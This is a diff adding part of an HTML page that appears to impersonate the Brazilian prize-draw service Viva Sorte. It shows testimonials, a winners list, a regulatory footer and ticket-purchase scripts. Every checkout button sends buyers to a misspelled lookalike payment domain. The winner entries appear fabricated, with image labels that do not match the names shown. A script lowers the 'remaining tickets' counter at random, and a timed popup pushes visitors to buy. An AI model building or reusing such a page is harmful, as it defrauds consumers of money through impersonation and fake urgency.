+            <p class="depoimento-texto">"Sempre acreditei que poderia ganhar, mas não esperava que seria tão rápido! Comprei 100 titulos e fui sorteada em menos de 2 meses!"</p>
+            <div class="depoimento-data">Ganhador em 01/04/2025</div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="depoimento-card">
+            <div class="depoimento-header">
+              <img src="images/avatar3.jpg" alt="Ganhador" class="rounded-circle">
+              <div class="depoimento-info">
+                <h4>Pedro Oliveira</h4>
+                <p>Ganhador da RAM</p>
+              </div>
+            </div>
+            <p class="depoimento-texto">"Incrível! Comprei apenas 30 titulos e fui sorteado. O atendimento foi excelente e a entrega do veículo foi super rápida!"</p>
+            <div class="depoimento-data">Ganhador em 06/02/2025</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ganhadores-section">
+    <div class="container-principal">
+      <h2 class="ganhadores-title">Ganhadores do último sorteio</h2>
+      <p class="ganhadores-subtitle">Confira os ganhadores do sorteio da edição 168 de domingo, 29 de março de 2025</p>
+      
+      <div class="ganhadores-carousel">
+        <div class="ganhador-card">
+          <img src="images/avatar-placeholder2.png" alt="Vivi" class="ganhador-foto">
+          <div class="ganhador-info">
+            <div class="ganhador-numero">0731065</div>
+            <div class="ganhador-nome">Viviane Aparecida</div>
+            <div class="ganhador-cidade">Osasco - SP</div>
+            <div class="ganhador-premio">Shineray JET 125 0Km no valor líquido de R$ 7.500,00 (cada)</div>
+          </div>
+        </div>
+
+        <div class="ganhador-card">
+          <img src="images/avatar4.jpg" alt="José F. B. M." class="ganhador-foto">
+          <div class="ganhador-info">
+            <div class="ganhador-numero">1659296</div>
+            <div class="ganhador-nome">Carla Medeiros</div>
+            <div class="ganhador-cidade">Goianira - GO</div>
+            <div class="ganhador-premio">Shineray JET 125 0Km no valor líquido de R$ 7.500,00 (cada)</div>
+          </div>
+        </div>
+
+        <div class="ganhador-card">
+          <img src="images/avatar2.jpg" alt="Francisco M." class="ganhador-foto">
+          <div class="ganhador-info">
+            <div class="ganhador-numero">2611702</div>
+            <div class="ganhador-nome">Maria Santos</div>
+            <div class="ganhador-cidade">Pelotas - RS</div>
+            <div class="ganhador-premio">Shineray JET 125 0Km no valor líquido de R$ 7.500,00 (cada)</div>
+          </div>
+        </div>
+
+        <div class="ganhador-card">
+          <img src="images/avatar-placeholder.png" alt="Maria L. S." class="ganhador-foto">
+          <div class="ganhador-info">
+            <div class="ganhador-numero">7663357</div>
+            <div class="ganhador-nome">Maria L. S.</div>
+            <div class="ganhador-cidade">Diadema - SP</div>
+            <div class="ganhador-premio">Shineray JET 125 0Km no valor líquido de R$ 7.500,00 (cada)</div>
+          </div>
+        </div>
+
+        <div class="ganhador-card">
+          <img src="images/avatar-placeholder1.png" alt="Terezinha C. D." class="ganhador-foto">
+          <div class="ganhador-info">
+            <div class="ganhador-numero">9522381</div>
+            <div class="ganhador-nome">Douglas F</div>
+            <div class="ganhador-cidade">Novo Hamburgo - RS</div>
+            <div class="ganhador-premio">Shineray JET 125 0Km no valor líquido de R$ 7.500,00 (cada)</div>
+          </div>
+        </div>
+      </div>
+
+      <a href="https://www.instagram.com/vivasorte" class="ver-mais-btn">Ver mais resultados</a>
+    </div>
+  </div>
+
+  
+  <link href="css/rodape.css" rel="stylesheet">
+
+
+<div class="rodape">
+    <div class="container-principal">
+        <img class="logo-rodape" src="images/logo.png">
+
+        <div class="redes">
+            <i class="bi bi-instagram"></i>
+            <i class="bi bi-facebook"></i>
+            <i class="bi bi-twitter"></i>
+            <i class="bi bi-youtube"></i>
+        </div>
+
+        <h1>Sorteios lastreados por Títulos de Capitalização, da Modalidade Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui indicados são líquidos, já descontado o devido imposto de renda de 25%. O registro deste plano na SUSEP não implica, por parte da Autarquia, incentivo ou recomendação a sua comercialização.</h1>
+        
+        <div class="linha-rodape"></div>
+
+        <div class="patterns-rodape">
+            <div class="pattern-rodape">
+                Títulos emitidos por:
+                <img src="images/viacap.png">
+            </div>
+
+            <div class="pattern-rodape">
+                Promoção realizada por:
+                <img src="images/viva.png">
+            </div>
+
+            <div class="pattern-rodape">
+                Desenvolvimento:
+                <img src="images/edjdigital.png">
+            </div>
+        </div>
+    </div>
+</div>
+
+  <!-- BOTÃO + E - -->
+  <script>
+    const precoPorUnidade = 0.99;
+
+    function incrementar() {
+        var input = document.getElementById('numero');
+        var valorAtual = parseInt(input.value);
+        if (valorAtual < 200) {
+            if (valorAtual === 0) {
+                input.value = 7;
+            } else if (valorAtual === 7) {
+                input.value = 10;
+            } else if (valorAtual === 10) {
+                input.value = 20;
+            } else if (valorAtual === 20) {
+                input.value = 50;
+            } else if (valorAtual === 50) {
+                input.value = 100;
+            } else if (valorAtual === 100) {
+                input.value = 200;
+            }
+        }
+        highlightButton();
+    }
+
+    function decrementar() {
+    var input = document.getElementById('numero');
+    var valorAtual = parseInt(input.value);
+    if (valorAtual > 0) {
+        if (valorAtual === 200) {
+            input.value = 100;
+        } else if (valorAtual === 100) {
+            input.value = 50;
+        } else if (valorAtual === 50) {
+            input.value = 20;
+        } else if (valorAtual === 20) {
+            input.value = 10;
+        } else if (valorAtual === 10) {
+            input.value = 7;
+        } else if (valorAtual === 7) {
+            input.value = 0;
+        }
+    }
+    highlightButton();
+}
+
+    function highlightButton() {
+        var input = document.getElementById('numero');
+        var valorAtual = parseInt(input.value);
+        var botoesCotas = document.querySelectorAll('.cota');
+        var botaoAdicionarCarrinho = document.getElementById('btn-adicionar-carrinho');
+        var valorTotal = document.getElementById('valor-total');
+        var link;
+
+        botoesCotas.forEach(function (botao) {
+            botao.classList.remove('cota-selected');
+            var valorBotao = parseInt(botao.querySelector('.cota-qtd').innerText.trim());
+            if (valorBotao === valorAtual) {
+                botao.classList.add('cota-selected');
+                switch (valorBotao) {
+                    case 15:
+                        link = "https://pay.compraegurapaay.com/checkout/4dbe2974-bf2d-4c6e-bd79-e90b36c4229b" + window.location.search;
+                        break;
+                    case 30:
+                        link = "https://pay.compraegurapaay.com/checkout/b5e77539-92ee-49f8-9f0a-af11ed7b8742" + window.location.search;
+                        break;
+                    case 40:
+                        link = "https://pay.compraegurapaay.com/checkout/a910e4ef-cef3-470f-8538-63b62304eb6e" + window.location.search;
+                        break;
+                    case 70:
+                        link = "https://pay.compraegurapaay.com/checkout/97522949-b889-4bd0-8c06-6c6fb6377641" + window.location.search;
+                        break;
+                    case 100:
+                        link = "https://pay.compraegurapaay.com/checkout/a2420463-2cbe-4b3d-8577-766042861f24" + window.location.search;
+                        break;
+                    case 200:
+                        link = "https://pay.compraegurapaay.com/checkout/518119a6-f34b-40b6-9a93-07d8f409201f" + window.location.search;
+                        break;
+                
+                    default:
+                        break;
+                }
+                botaoAdicionarCarrinho.setAttribute('onclick', 'adicionarAoCarrinho("' + link + '")');
+            }
+        });
+
+        if (valorAtual === 0) {
+            botaoAdicionarCarrinho.disabled = true;
+            valorTotal.innerText = "R$ 0,00";
+        } else {
+            botaoAdicionarCarrinho.disabled = false;
+            valorTotal.innerText = "R$ " + (valorAtual * precoPorUnidade).toFixed(2).replace('.', ',');
+        }
+    }
+
+    function selecionarValor(valor) {
+        var input = document.getElementById('numero');
+        input.value = valor;
+        highlightButton();
+    }
+
+    function adicionarAoCarrinho(link) {
+        const botao = document.getElementById('btn-adicionar-carrinho');
+        botao.innerHTML = '<i class="bi bi-arrow-repeat"></i> <span>PROCESSANDO...</span>';
+        botao.disabled = true;
+        
+        // Simular delay de processamento
+        setTimeout(() => {
+            window.location.href = link;
+        }, 1500);
+    }
+
+    // Adicionar efeito de ripple em todos os botões
+    document.querySelectorAll('.cota, .adc-carrinho, .btn-contador-cotas').forEach(button => {
+      button.addEventListener('click', function(e) {
+        let ripple = document.createElement('span');
+        ripple.classList.add('ripple');
+        
+        this.appendChild(ripple);
+        
+        let x = e.clientX - e.target.offsetLeft;
+        let y = e.clientY - e.target.offsetTop;
+        
+        ripple.style.left = `${x}px`;
+        ripple.style.top = `${y}px`;
+        
+        setTimeout(() => {
+          ripple.remove();
+        }, 600);
+      });
+    });
+
+    document.getElementById('numero').addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, ''); // Apenas números permitidos
+        var valor = parseInt(this.value);
+        if (valor > 500) {
+            this.value = 500;
+        } else if (valor < 10) {
+            this.value = 0;
+        } else if (valor % 10 !== 0) {
+            this.value = Math.floor(valor / 10) * 10;
+        }
+        highlightButton();
+    });
+
+    // Adicionar animação ao scroll
+    window.addEventListener('scroll', function() {
+      const elements = document.querySelectorAll('.garantia-card, .depoimento-card, .card-hospital');
+      elements.forEach(element => {
+        const position = element.getBoundingClientRect();
+        if (position.top < window.innerHeight - 100) {
+          element.style.opacity = '1';
+          element.style.transform = 'translateY(0)';
+        }
+      });
+    });
+
+    // Adicionar efeito de parallax no banner
+    window.addEventListener('scroll', function() {
+      const banner = document.querySelector('.banner img');
+      const scrolled = window.pageYOffset;
+      banner.style.transform = `translateY(${scrolled * 0.5}px)`;
+    });
+
+</script>
+
+  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+
+<div class="popup-urgencia">
+  <div class="popup-urgencia-content">
+    <i class="bi bi-clock-history"></i>
+    <strong>Últimas Chances!</strong>
+    <p>Aproveite agora, restam apenas</p>
+    <span id="popup-cotas-restantes">5.059</span>
+    <p>Títulos disponíveis para este sorteio.<br>Não perca a oportunidade de realizar seu sonho!<br>Viva Sorte  06/05/2025 </p>
+    <button class="btn-realizar-sonho" onclick="realizarSonho()">Comprar Agora</button>
+  </div>
+</div>
+
+<script>
+  // Função para mostrar o popup após 10 segundos
+  setTimeout(() => {
+    const popup = document.querySelector('.popup-urgencia');
+    popup.classList.add('show');
+    
+    // Atualizar o contador de cotas no popup
+    const popupCotas = document.getElementById('popup-cotas-restantes');
+    const cotasElement = document.getElementById('cotas-restantes');
+    
+    setInterval(() => {
+      popupCotas.textContent = cotasElement.textContent;
+    }, 1000);
+  }, 20000);
+
+  // Função para fechar o popup
+  function fecharPopup() {
+    const popup = document.querySelector('.popup-urgencia');
+    popup.classList.remove('show');
+  }
+
+  // Função para atualizar o contador de cotas restantes
+  function atualizarCotasRestantes() {
+    var cotasElement = document.getElementById('cotas-restantes');
+    var popupCotas = document.getElementById('popup-cotas-restantes');
+    var cotasAtuais = parseInt(cotasElement.textContent);
+    
+    if (cotasAtuais > 0) {
+      // Reduzir aleatoriamente entre 1 e 3 cotas a cada 30 segundos
+      var reducao = Math.floor(Math.random() * 3) + 1;
+      cotasAtuais = Math.max(0, cotasAtuais - reducao);
+      cotasElement.textContent = cotasAtuais;
+      popupCotas.textContent = cotasAtuais;
+      
+      // Adicionar efeito de destaque quando houver mudança
+      cotasElement.classList.add('highlight');
+      popupCotas.classList.add('highlight');
+      setTimeout(() => {
+        cotasElement.classList.remove('highlight');
+        popupCotas.classList.remove('highlight');
+      }, 1000);
+    }
+  }
+
+  // Atualizar cotas restantes a cada 30 segundos
+  setInterval(atualizarCotasRestantes, 30000);
+
+  function realizarSonho() {
+    fecharPopup();
+    setTimeout(() => {
+      document.querySelector('.cotas').scrollIntoView({ behavior: 'smooth' });
+    }, 300);
+  }
+  
+</script>
+
+</body></html>
